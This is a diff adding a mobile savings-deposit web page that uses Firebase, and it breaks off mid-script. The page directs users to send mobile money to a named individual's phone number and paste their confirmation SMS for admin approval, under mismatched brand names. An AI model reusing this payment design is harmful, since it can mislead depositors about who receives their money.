@@ -1,0 +1,1661 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+    <title>Secure Savings Deposit · Sajvera Capital</title>
+
+    <!-- ============================================================
+         FIREBASE SDKs – Load these in the <head>
+         ============================================================ -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+
+    <style>
+        /* ──────────────────────────────────────────────
+           RESET & BASE
+        ────────────────────────────────────────────── */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #F9FAFB;
+            color: #111827;
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            touch-action: manipulation;
+        }
+
+        .screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s cubic-bezier(0.22, 1, 0.36, 1);
+            padding: 20px 16px;
+            will-change: opacity;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+            background: #F9FAFB;
+        }
+
+        .screen.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .screen::-webkit-scrollbar {
+            width: 0;
+            background: transparent;
+        }
+        .screen {
+            scrollbar-width: none;
+        }
+
+        /* ──────────────────────────────────────────────
+           BACK BUTTON
+        ────────────────────────────────────────────── */
+        .back-btn {
+            position: sticky;
+            top: 0;
+            left: 0;
+            z-index: 5;
+            align-self: flex-start;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 10px 14px 10px 10px;
+            background: rgba(255, 255, 255, 0.80);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            border: 1px solid rgba(255, 255, 255, 0.20);
+            border-radius: 40px;
+            color: #1E3A5F;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            touch-action: manipulation;
+            user-select: none;
+            letter-spacing: 0.2px;
+            text-decoration: none;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.04);
+            margin-bottom: 16px;
+        }
+        .back-btn:active {
+            transform: scale(0.94);
+            background: rgba(255, 255, 255, 0.95);
+        }
+        .back-btn svg {
+            width: 20px;
+            height: 20px;
+            stroke: currentColor;
+            stroke-width: 2.5;
+            fill: none;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            flex-shrink: 0;
+        }
+
+        /* ──────────────────────────────────────────────
+           LOADING SCREEN
+        ────────────────────────────────────────────── */
+        #loadingScreen {
+            background: #1E3A5F;
+            z-index: 100;
+        }
+
+        .loading-content {
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+            color: #fff;
+        }
+
+        .loading-spinner {
+            width: 52px;
+            height: 52px;
+            border: 4px solid rgba(255, 255, 255, 0.10);
+            border-top-color: #93BBFC;
+            border-radius: 50%;
+            animation: spin 0.9s cubic-bezier(0.6, 0, 0.4, 1) infinite;
+            margin: 0 auto 24px;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loading-title {
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+            margin-bottom: 4px;
+            color: #fff;
+        }
+        .loading-title span {
+            color: #93BBFC;
+        }
+
+        .loading-sub {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.50);
+            margin-bottom: 28px;
+        }
+
+        .check-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            text-align: left;
+            margin-top: 4px;
+        }
+
+        .check-item {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 12px 16px;
+            background: rgba(255, 255, 255, 0.04);
+            border-radius: 14px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            transition: all 0.5s ease;
+            opacity: 0.30;
+            transform: translateX(-6px);
+        }
+
+        .check-item.done {
+            opacity: 1;
+            transform: translateX(0);
+            border-color: rgba(147, 187, 252, 0.25);
+            background: rgba(147, 187, 252, 0.08);
+        }
+
+        .check-item .check-icon {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            flex-shrink: 0;
+            border: 2px solid rgba(255, 255, 255, 0.15);
+            transition: all 0.4s ease;
+            color: transparent;
+        }
+        .check-item.done .check-icon {
+            border-color: #93BBFC;
+            background: #93BBFC;
+            color: #1E3A5F;
+        }
+
+        .check-item .check-label {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.55);
+            transition: color 0.4s ease;
+        }
+        .check-item.done .check-label {
+            color: rgba(255, 255, 255, 0.85);
+        }
+
+        /* ──────────────────────────────────────────────
+           PHONE SCREEN
+        ────────────────────────────────────────────── */
+        #phoneScreen {
+            background: #FFFFFF;
+            z-index: 10;
+            justify-content: flex-start;
+            padding-top: 40px;
+        }
+
+        .screen-header {
+            width: 100%;
+            max-width: 420px;
+            text-align: left;
+            margin-bottom: 20px;
+            padding: 0 4px;
+        }
+        .screen-header h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1E3A5F;
+        }
+        .screen-header p {
+            font-size: 14px;
+            color: #111827;
+            opacity: 0.6;
+            margin-top: 2px;
+        }
+        .screen-header .sub {
+            font-size: 14px;
+            color: #111827;
+            opacity: 0.5;
+            margin-top: 4px;
+        }
+
+        .phone-card {
+            max-width: 420px;
+            width: 100%;
+            background: #FFFFFF;
+            border-radius: 32px;
+            padding: 20px 16px 24px;
+            border: 1px solid rgba(30, 58, 95, 0.04);
+            box-shadow: 0 12px 48px rgba(30, 58, 95, 0.06);
+        }
+
+        .phone-input-wrap {
+            position: relative;
+            margin-bottom: 16px;
+        }
+
+        .phone-prefix {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-weight: 700;
+            font-size: 18px;
+            color: #1E3A5F;
+            opacity: 0.5;
+            background: transparent;
+            pointer-events: none;
+        }
+
+        .phone-input {
+            width: 100%;
+            padding: 16px 16px 16px 70px;
+            font-size: 20px;
+            font-weight: 600;
+            color: #1E3A5F;
+            border: 2px solid #F0F4F8;
+            border-radius: 20px;
+            background: #F0F4F8;
+            outline: none;
+            transition: border-color 0.3s ease, background 0.3s ease;
+            font-family: inherit;
+            letter-spacing: 0.5px;
+        }
+        .phone-input:focus {
+            border-color: #3B82F6;
+            background: #FFFFFF;
+        }
+        .phone-input.error {
+            border-color: #EF4444;
+            background: #FEF2F2;
+        }
+
+        .phone-hint {
+            font-size: 13px;
+            color: #111827;
+            opacity: 0.5;
+            margin-top: -8px;
+            margin-bottom: 12px;
+            padding-left: 4px;
+        }
+
+        .phone-error {
+            font-size: 13px;
+            padding: 8px 12px;
+            background: #FEF2F2;
+            border-radius: 8px;
+            border: 1px solid #FCA5A5;
+            color: #991B1B;
+            margin-top: -4px;
+            margin-bottom: 12px;
+            display: none;
+        }
+
+        .registered-phone {
+            background: #F0F4F8;
+            border-radius: 12px;
+            padding: 10px 14px;
+            font-size: 14px;
+            color: #1E3A5F;
+            margin-bottom: 16px;
+            display: none;
+            align-items: center;
+            gap: 8px;
+        }
+        .registered-phone .label {
+            opacity: 0.6;
+        }
+        .registered-phone .number {
+            font-weight: 700;
+        }
+        .registered-phone .use-btn {
+            background: transparent;
+            border: none;
+            color: #3B82F6;
+            font-weight: 600;
+            cursor: pointer;
+            padding: 4px 8px;
+            border-radius: 20px;
+            font-size: 13px;
+        }
+        .registered-phone .use-btn:active {
+            background: rgba(59, 130, 246, 0.10);
+        }
+
+        .btn-primary {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: linear-gradient(135deg, #1E3A5F, #3B82F6);
+            color: #FFFFFF;
+            font-weight: 700;
+            font-size: 17px;
+            padding: 16px 32px;
+            border: none;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.22, 1, 0.36, 1);
+            box-shadow: 0 6px 24px rgba(30, 58, 95, 0.20);
+            letter-spacing: 0.3px;
+            width: 100%;
+            touch-action: manipulation;
+            user-select: none;
+        }
+        .btn-primary:active {
+            transform: scale(0.96);
+            box-shadow: 0 4px 16px rgba(30, 58, 95, 0.25);
+        }
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* ──────────────────────────────────────────────
+           AGENT SCREEN
+        ────────────────────────────────────────────── */
+        #agentScreen {
+            background: #FFFFFF;
+            z-index: 20;
+            justify-content: flex-start;
+            padding-top: 40px;
+        }
+
+        .agent-card {
+            max-width: 420px;
+            width: 100%;
+            background: #FFFFFF;
+            border-radius: 32px;
+            padding: 20px 16px 24px;
+            border: 1px solid rgba(30, 58, 95, 0.04);
+            box-shadow: 0 12px 48px rgba(30, 58, 95, 0.06);
+        }
+
+        .branch-badge {
+            display: inline-block;
+            background: #DBEAFE;
+            color: #1E3A5F;
+            font-weight: 700;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            padding: 4px 12px;
+            border-radius: 40px;
+            margin-bottom: 8px;
+        }
+
+        .agent-display {
+            text-align: center;
+            padding: 12px 0;
+        }
+
+        .agent-network {
+            font-size: 14px;
+            font-weight: 700;
+            color: #3B82F6;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .agent-name {
+            font-size: 24px;
+            font-weight: 800;
+            color: #1E3A5F;
+            margin: 4px 0 2px;
+        }
+
+        .agent-number {
+            font-size: 22px;
+            font-weight: 600;
+            color: #1E3A5F;
+            letter-spacing: 1px;
+            margin-bottom: 4px;
+        }
+
+        .agent-status {
+            font-size: 14px;
+            color: #10B981;
+            font-weight: 600;
+        }
+
+        .copy-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: #F0F4F8;
+            color: #1E3A5F;
+            font-weight: 600;
+            font-size: 15px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 40px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            width: 100%;
+            touch-action: manipulation;
+            user-select: none;
+            margin-top: 8px;
+        }
+        .copy-btn:active {
+            transform: scale(0.96);
+            background: #E5E7EB;
+        }
+
+        .copy-feedback {
+            font-size: 13px;
+            color: #10B981;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .agent-divider {
+            border: none;
+            border-top: 1px solid #F0F4F8;
+            margin: 16px 0;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            font-size: 14px;
+        }
+        .info-row .label {
+            color: #111827;
+            opacity: 0.6;
+        }
+        .info-row .value {
+            font-weight: 700;
+            color: #1E3A5F;
+        }
+
+        .instructions {
+            background: #F0F4F8;
+            border-radius: 12px;
+            padding: 12px 16px;
+            font-size: 14px;
+            line-height: 1.6;
+            color: #111827;
+            opacity: 0.8;
+            margin: 12px 0 16px;
+        }
+        .instructions strong {
+            color: #1E3A5F;
+        }
+
+        .btn-confirm {
+            background: linear-gradient(135deg, #10B981, #059669);
+            box-shadow: 0 6px 24px rgba(16, 185, 129, 0.25);
+        }
+        .btn-confirm:active {
+            box-shadow: 0 4px 16px rgba(16, 185, 129, 0.30);
+        }
+
+        /* ──────────────────────────────────────────────
+           SMS VERIFICATION SCREEN
+        ────────────────────────────────────────────── */
+        #smsVerificationScreen {
+            background: #FFFFFF;
+            z-index: 25;
+            justify-content: flex-start;
+            padding-top: 40px;
+        }
+
+        .sms-card {
+            max-width: 420px;
+            width: 100%;
+            background: #FFFFFF;
+            border-radius: 32px;
+            padding: 20px 16px 24px;
+            border: 1px solid rgba(30, 58, 95, 0.04);
+            box-shadow: 0 12px 48px rgba(30, 58, 95, 0.06);
+        }
+
+        .sms-textarea-wrap {
+            margin-bottom: 16px;
+        }
+
+        .sms-textarea {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 16px;
+            font-weight: 400;
+            color: #1E3A5F;
+            border: 2px solid #F0F4F8;
+            border-radius: 20px;
+            background: #F0F4F8;
+            outline: none;
+            transition: border-color 0.3s ease, background 0.3s ease;
+            font-family: inherit;
+            resize: vertical;
+            min-height: 160px;
+            line-height: 1.6;
+        }
+        .sms-textarea:focus {
+            border-color: #3B82F6;
+            background: #FFFFFF;
+        }
+        .sms-textarea.error {
+            border-color: #EF4444;
+            background: #FEF2F2;
+        }
+
+        .sms-hint {
+            font-size: 13px;
+            color: #111827;
+            opacity: 0.6;
+            margin-bottom: 12px;
+            padding-left: 4px;
+            line-height: 1.5;
+        }
+
+        .sms-error {
+            font-size: 13px;
+            padding: 8px 12px;
+            background: #FEF2F2;
+            border-radius: 8px;
+            border: 1px solid #FCA5A5;
+            color: #991B1B;
+            margin-top: -4px;
+            margin-bottom: 12px;
+            display: none;
+        }
+
+        .sms-reason {
+            background: #F0F4F8;
+            border-radius: 12px;
+            padding: 12px 16px;
+            font-size: 13px;
+            line-height: 1.6;
+            color: #111827;
+            opacity: 0.8;
+            margin: 12px 0 16px;
+            border-left: 3px solid #3B82F6;
+        }
+        .sms-reason strong {
+            color: #1E3A5F;
+        }
+
+        /* ──────────────────────────────────────────────
+           PROCESSING SCREEN (loading after SMS submit)
+        ────────────────────────────────────────────── */
+        #processingScreen {
+            background: #F9FAFB;
+            z-index: 30;
+        }
+
+        /* ──────────────────────────────────────────────
+           SUCCESS SCREEN
+        ────────────────────────────────────────────── */
+        #successScreen {
+            background: #ECFDF5;
+            z-index: 40;
+            justify-content: center;
+        }
+
+        .success-card {
+            max-width: 420px;
+            width: 100%;
+            background: #FFFFFF;
+            border-radius: 32px;
+            padding: 32px 24px 28px;
+            text-align: center;
+            box-shadow: 0 12px 48px rgba(6, 78, 59, 0.06);
+        }
+
+        .success-check {
+            width: 64px;
+            height: 64px;
+            background: #D1FAE5;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            animation: popIn 0.6s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+        }
+        .success-check svg {
+            width: 36px;
+            height: 36px;
+            stroke: #1E3A5F;
+            stroke-width: 2.5;
+            fill: none;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+        @keyframes popIn {
+            0% {
+                transform: scale(0.5);
+                opacity: 0;
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .success-card h3 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1E3A5F;
+        }
+        .success-card .sub {
+            font-size: 14px;
+            color: #111827;
+            opacity: 0.6;
+            margin-bottom: 16px;
+        }
+
+        .success-details {
+            background: #F0F4F8;
+            border-radius: 16px;
+            padding: 16px;
+            text-align: left;
+            margin-bottom: 16px;
+        }
+        .success-details .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 4px 0;
+            font-size: 14px;
+        }
+        .success-details .row .lbl {
+            color: #111827;
+            opacity: 0.6;
+        }
+        .success-details .row .val {
+            font-weight: 700;
+            color: #1E3A5F;
+        }
+
+        .status-pending {
+            background: #FEF3C7;
+            color: #92400E;
+            padding: 4px 16px;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            display: inline-block;
+        }
+
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            width: 100%;
+            margin-top: 8px;
+        }
+
+        /* ──────────────────────────────────────────────
+           RESPONSIVE
+        ────────────────────────────────────────────── */
+        @media (max-width: 480px) {
+            .phone-input {
+                font-size: 18px;
+                padding: 14px 14px 14px 66px;
+            }
+            .phone-prefix {
+                font-size: 16px;
+                left: 14px;
+            }
+            .agent-name {
+                font-size: 20px;
+            }
+            .agent-number {
+                font-size: 18px;
+            }
+            .success-card {
+                padding: 24px 16px;
+            }
+            .back-btn {
+                font-size: 13px;
+                padding: 8px 12px 8px 8px;
+                margin-bottom: 12px;
+            }
+            .back-btn svg {
+                width: 18px;
+                height: 18px;
+            }
+            .screen-header h2 {
+                font-size: 20px;
+            }
+            .sms-textarea {
+                min-height: 120px;
+                font-size: 15px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .sms-textarea {
+                min-height: 100px;
+            }
+        }
+
+        @media (min-width: 600px) {
+            .phone-card,
+            .agent-card,
+            .sms-card,
+            .success-card {
+                max-width: 480px;
+            }
+        }
+
+        /* ──────────────────────────────────────────────
+           UTILITIES
+        ────────────────────────────────────────────── */
+        .text-center {
+            text-align: center;
+        }
+        .w-full {
+            width: 100%;
+        }
+        .mt-1 {
+            margin-top: 4px;
+        }
+        .mt-2 {
+            margin-top: 8px;
+        }
+        .mt-3 {
+            margin-top: 14px;
+        }
+        .mb-1 {
+            margin-bottom: 4px;
+        }
+        .mb-2 {
+            margin-bottom: 8px;
+        }
+        .flex-col {
+            display: flex;
+            flex-direction: column;
+        }
+        .items-center {
+            align-items: center;
+        }
+        .text-blue {
+            color: #3B82F6;
+        }
+        .text-navy {
+            color: #1E3A5F;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ════════════════════════════════════════════════
+    SCREEN: LOADING (initial)
+    ════════════════════════════════════════════════ -->
+    <div id="loadingScreen" class="screen active">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <div class="loading-title">Preparing your <span>savings deposit</span>…</div>
+            <div class="loading-sub">Please wait</div>
+            <div class="check-list" id="loadingCheckList">
+                <div class="check-item" data-index="0">
+                    <span class="check-icon">○</span>
+                    <span class="check-label">Loading your savings plan…</span>
+                </div>
+                <div class="check-item" data-index="1">
+                    <span class="check-icon">○</span>
+                    <span class="check-label">Preparing secure payment…</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ════════════════════════════════════════════════
+    SCREEN: PHONE NUMBER
+    ════════════════════════════════════════════════ -->
+    <div id="phoneScreen" class="screen">
+        <button class="back-btn" id="phoneBackBtn" aria-label="Back">
+            <svg viewBox="0 0 24 24"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
+            Back
+        </button>
+        <div class="screen-header">
+            <h2>Secure Savings Deposit</h2>
+            <p>Enter the phone number you will use to make your savings payment.</p>
+            <div class="sub">We use your mobile network to display the correct Sajvera Capital payment agent.</div>
+        </div>
+        <div class="phone-card">
+            <div id="registeredPhoneContainer" class="registered-phone">
+                <span class="label">Registered phone:</span>
+                <span class="number" id="registeredPhoneNumber">+260 96 123 4567</span>
+                <button class="use-btn" id="useRegisteredBtn">Use this</button>
+            </div>
+            <div class="phone-input-wrap">
+                <span class="phone-prefix">+260</span>
+                <input type="tel" id="phoneInput" class="phone-input" placeholder="96 307 0992" maxlength="15" />
+            </div>
+            <div class="phone-hint" id="phoneHint">Enter a valid Zambian mobile number (e.g., 0963070992)</div>
+            <div class="phone-error" id="phoneError">⚠️ Invalid phone number</div>
+            <button class="btn-primary" id="phoneContinueBtn" disabled>CONTINUE</button>
+        </div>
+    </div>
+
+    <!-- ════════════════════════════════════════════════
+    SCREEN: AGENT DISPLAY (with payment instructions)
+    ════════════════════════════════════════════════ -->
+    <div id="agentScreen" class="screen">
+        <button class="back-btn" id="agentBackBtn" aria-label="Back">
+            <svg viewBox="0 0 24 24"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
+            Back
+        </button>
+        <div class="screen-header">
+            <h2>Payment Agent</h2>
+            <p>Send your savings to the agent below</p>
+        </div>
+        <div class="agent-card">
+            <div class="branch-badge" id="agentBranchBadge">PureOre Wealth</div>
+            <div class="agent-display">
+                <div class="agent-network" id="agentNetwork">MTN</div>
+                <div class="agent-name" id="agentName">John Kabwe</div>
+                <div class="agent-number" id="agentNumber">096 307 0992</div>
+                <div class="agent-status">✓ MTN Payment Agent</div>
+                <button class="copy-btn" id="copyBtn">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+                    COPY NUMBER
+                </button>
+                <div class="copy-feedback" id="copyFeedback">✓ Agent number copied</div>
+            </div>
+
+            <hr class="agent-divider" />
+
+            <div class="info-row">
+                <span class="label">Savings Branch</span>
+                <span class="value" id="agentBranchName">PureOre Wealth</span>
+            </div>
+            <div class="info-row">
+                <span class="label">Savings Amount</span>
+                <span class="value" id="agentAmount">K100.00</span>
+            </div>
+
+            <div class="instructions">
+                <strong>How to Pay</strong><br />
+                1. Open your mobile-money service.<br />
+                2. Send the exact savings amount to the displayed payment agent.<br />
+                3. Make sure the payment is made using the phone number you entered.<br />
+                4. Complete the payment.<br />
+                5. Return here and confirm that you have made the payment.
+            </div>
+
+            <button class="btn-primary btn-confirm" id="paidBtn">I HAVE PAID</button>
+        </div>
+    </div>
+
+    <!-- ════════════════════════════════════════════════
+    SCREEN: SMS VERIFICATION
+    ════════════════════════════════════════════════ -->
+    <div id="smsVerificationScreen" class="screen">
+        <button class="back-btn" id="smsBackBtn" aria-label="Back">
+            <svg viewBox="0 0 24 24"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
+            Back
+        </button>
+        <div class="screen-header">
+            <h2>Payment Verification</h2>
+            <p>Paste the full payment confirmation SMS you received after completing the payment.</p>
+        </div>
+        <div class="sms-card">
+            <div class="sms-textarea-wrap">
+                <textarea id="smsInput" class="sms-textarea" placeholder="Paste the complete MTN, Airtel or Zamtel payment confirmation SMS here..." rows="6"></textarea>
+            </div>
+            <div class="sms-hint">After completing your mobile-money payment, copy the FULL confirmation SMS you received and paste it below. This helps our administrator verify your payment.</div>
+            <div class="sms-error" id="smsError">⚠️ Payment SMS Required. Please paste the full payment confirmation SMS before continuing.</div>
+
+            <div class="sms-reason">
+                <strong>Why do we need this?</strong><br />
+                Your payment confirmation message contains transaction information that helps the administrator verify that the payment was made to the correct payment agent.
+            </div>
+
+            <button class="btn-primary" id="smsSubmitBtn" disabled>SUBMIT VERIFICATION</button>
+        </div>
+    </div>
+
+    <!-- ════════════════════════════════════════════════
+    SCREEN: PAYMENT PROCESSING (loading after SMS submit)
+    ════════════════════════════════════════════════ -->
+    <div id="processingScreen" class="screen">
+        <div class="loading-content" style="color:#1E3A5F;">
+            <div class="loading-spinner" style="border-top-color:#3B82F6; border-color:rgba(30,58,95,0.10);"></div>
+            <div class="loading-title" style="color:#1E3A5F;">Processing your <span style="color:#3B82F6;">savings submission</span>…</div>
+            <div class="loading-sub" style="color:#1E3A5F; opacity:0.6;">Please wait</div>
+            <div class="check-list" id="processingCheckList">
+                <div class="check-item" data-index="0">
+                    <span class="check-icon">○</span>
+                    <span class="check-label">Recording payment information…</span>
+                </div>
+                <div class="check-item" data-index="1">
+                    <span class="check-icon">○</span>
+                    <span class="check-label">Creating your savings transaction…</span>
+                </div>
+                <div class="check-item" data-index="2">
+                    <span class="check-icon">○</span>
+                    <span class="check-label">Linking your payment to <span id="processingBranchLabel">PureOre Wealth</span>…</span>
+                </div>
+                <div class="check-item" data-index="3">
+                    <span class="check-icon">○</span>
+                    <span class="check-label">Submitting for administrator verification…</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ════════════════════════════════════════════════
+    SCREEN: SUCCESS
+    ════════════════════════════════════════════════ -->
+    <div id="successScreen" class="screen">
+        <div class="success-card">
+            <div class="success-check">
+                <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+            </div>
+            <h3>Payment Submitted Successfully</h3>
+            <div class="sub">Your savings deposit is now pending admin approval</div>
+
+            <div class="success-details" id="successDetails">
+                <div class="row"><span class="lbl">Branch</span><span class="val" id="successBranch">PureOre Wealth</span></div>
+                <div class="row"><span class="lbl">Amount</span><span class="val" id="successAmount">K100.00</span></div>
+                <div class="row"><span class="lbl">Payment Network</span><span class="val" id="successNetwork">MTN</span></div>
+                <div class="row"><span class="lbl">Agent</span><span class="val" id="successAgent">John Kabwe</span></div>
+                <div class="row"><span class="lbl">SMS Provided</span><span class="val" style="font-size:11px; opacity:0.6;">✅</span></div>
+                <div class="row"><span class="lbl">Status</span><span class="val"><span class="status-pending">🔵 PENDING</span></span></div>
+            </div>
+
+            <p style="font-size:14px; color:#111827; opacity:0.7; margin-bottom:16px; line-height:1.6;">
+                Your payment information and SMS verification have been submitted successfully. Your savings deposit is now waiting for administrator verification and approval.
+            </p>
+
+            <div class="btn-group">
+                <button class="btn-primary" id="viewHistoryBtn">VIEW SAVING HISTORY</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ════════════════════════════════════════════════
+    JAVASCRIPT – FIREBASE CONFIG & AUTH
+    ════════════════════════════════════════════════ -->
+    <script>
+        // ================================================================
+        // FIREBASE CONFIG – Your project credentials
+        // ================================================================
+        var firebaseConfig = {
+            apiKey: "AIzaSyALbWDHrhratYCCq3WpAu7jZFw6S8kTg2U",
+            authDomain: "pureore-capital-zambia.firebaseapp.com",
+            projectId: "pureore-capital-zambia",
+            storageBucket: "pureore-capital-zambia.appspot.com",
+            messagingSenderId: "78967797858",
+            appId: "1:78967797858:web:379b9692951429c345793b",
+            measurementId: "G-FQKC29NYE9"
+        };
+
+        // ================================================================
+        // INITIALIZE FIREBASE (only once)
+        // ================================================================
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        var auth = firebase.auth();
+        var db = firebase.firestore();
+        db.settings({ persistence: true });
+        auth.setPersistence(firebase.auth.Auth.Persistence.LOCAL).catch(console.warn);
+
+        // ================================================================
+        // AUTH STATE CHECK – Redirect if not logged in
+        // ================================================================
+        var authResolved = false;
+        var redirectTimeout = null;
+
+        auth.onAuthStateChanged(function(user) {
+            if (user) {
+                authResolved = true;
+                if (redirectTimeout) {
+                    clearTimeout(redirectTimeout);
+                    redirectTimeout = null;
+                }
+                console.log('✅ User logged in:', user.uid, user.email);
+                // (Optional) Firestore user data fetch can be added here.
+            } else {
+                if (!authResolved) {
+                    if (!redirectTimeout) {
+                        redirectTimeout = setTimeout(function() {
+                            if (!auth.currentUser) {
+                                console.log('❌ No user found. Redirecting to login...');
+                                window.location.href = 'login.html';
+                            }
+                        }, 2000);
+                    }
+                } else {
+                    window.location.href = 'login.html';
+                }
+            }
+        }, function(error) {
+            console.error('Auth state error:', error);
+            window.location.href = 'login.html';
+        });
+
+        // ================================================================
+        // HELPER FUNCTIONS (Firebase-aware)
+        // ================================================================
+        function getLoggedInUser() {
+            var user = auth.currentUser;
+            if (user) {
+                return {
+                    id: user.uid,
+                    email: user.email,
+                    name: user.displayName || user.email,
+                    phone: user.phoneNumber || null
+                };
+            }
+            return null;
+        }
+
+        function logoutUser() {
+            auth.signOut().then(function() {
+                window.location.href = 'login.html';
+            }).catch(function(err) {
+                console.warn('Logout error:', err);
+            });
+        }
+
+        // ================================================================
+        // PAGE LOGIC (Firebase-aware)
+        // ================================================================
+        (function() {
+            'use strict';
+
+            // ── DOM refs ──
+            var loadingScreen = document.getElementById('loadingScreen');
+            var phoneScreen = document.getElementById('phoneScreen');
+            var agentScreen = document.getElementById('agentScreen');
+            var smsVerificationScreen = document.getElementById('smsVerificationScreen');
+            var processingScreen = document.getElementById('processingScreen');
+            var successScreen = document.getElementById('successScreen');
+
+            var loadingCheckList = document.getElementById('loadingCheckList');
+            var phoneInput = document.getElementById('phoneInput');
+            var phoneHint = document.getElementById('phoneHint');
+            var phoneError = document.getElementById('phoneError');
+            var phoneContinueBtn = document.getElementById('phoneContinueBtn');
+            var phoneBackBtn = document.getElementById('phoneBackBtn');
+            var agentBackBtn = document.getElementById('agentBackBtn');
+            var smsBackBtn = document.getElementById('smsBackBtn');
+
+            var registeredPhoneContainer = document.getElementById('registeredPhoneContainer');
+            var registeredPhoneNumber = document.getElementById('registeredPhoneNumber');
+            var useRegisteredBtn = document.getElementById('useRegisteredBtn');
+
+            var agentBranchBadge = document.getElementById('agentBranchBadge');
+            var agentNetwork = document.getElementById('agentNetwork');
+            var agentName = document.getElementById('agentName');
+            var agentNumber = document.getElementById('agentNumber');
+            var agentBranchName = document.getElementById('agentBranchName');
+            var agentAmount = document.getElementById('agentAmount');
+            var copyBtn = document.getElementById('copyBtn');
+            var copyFeedback = document.getElementById('copyFeedback');
+            var paidBtn = document.getElementById('paidBtn');
+
+            var smsInput = document.getElementById('smsInput');
+            var smsError = document.getElementById('smsError');
+            var smsSubmitBtn = document.getElementById('smsSubmitBtn');
+
+            var processingCheckList = document.getElementById('processingCheckList');
+            var processingBranchLabel = document.getElementById('processingBranchLabel');
+
+            var successBranch = document.getElementById('successBranch');
+            var successAmount = document.getElementById('successAmount');
+            var successNetwork = document.getElementById('successNetwork');
+            var successAgent = document.getElementById('successAgent');
+            var viewHistoryBtn = document.getElementById('viewHistoryBtn');
+
+            // ── State ──
+            var currentUser = null;
+            var branch = null;
+            var amount = 0;
+            var period = 0;
+            var reason = null;
+            var goalName = null;
+            var targetAmount = 0;
+            var interestRate = 0;
+            var phoneNumber = '';
+            var network = '';
+            var agent = null;
+            var transactionRecord = null;
+            var paymentSms = '';
+
+            // ── Agent Configuration ──
+            var AGENTS = {
+                MTN: {
+                    name: 'John Kabwe',
